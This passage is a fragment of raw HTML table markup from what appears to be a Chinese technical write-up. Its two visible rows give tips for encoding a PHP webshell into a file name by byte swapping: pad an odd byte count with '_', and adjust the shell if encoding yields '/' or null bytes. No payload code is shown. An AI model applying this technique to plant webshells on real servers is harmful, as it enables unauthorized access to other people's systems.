style="box-sizing: border-box;"><span leaf="">总字节数为奇数，最后一字节没配对</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4696" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 147.84375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">加 </span></span><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">_</span></code></span><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""> padding凑偶数</span></span></span></td></tr><tr style="box-sizing: border-box;break-inside: avoid;break-after: auto;border: 1px solid rgb(223, 226, 229);margin: 0px;padding: 0px;"><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4698" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 132.484375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">shell编码后含有 </span></span><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">/</span></code></span><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""> 或 </span></span><span md-inline="code" spellcheck="false" style="box-sizing: border-box;"><code style="box-sizing: border-box;font-family: var(--monospace);text-align: left;vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em;"><span leaf="">\0</span></code></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4699" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 171.796875px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">文件名非法</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4700" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 238.921875px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">某些PHP代码交换后产生路径分隔符或空字节</span></span></span></td><td style="box-sizing: border-box;padding: 6px 13px;border: 1px solid rgb(223, 226, 229);margin: 0px;min-width: 32px;"><span cid="n4701" mdtype="table_cell" style="box-sizing: border-box;display: inline-block;min-width: 1ch;width: 147.84375px;min-height: 10px;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf="">调整shell内容确保预编码安全</span></span></span></td></tr></tbody></table>  
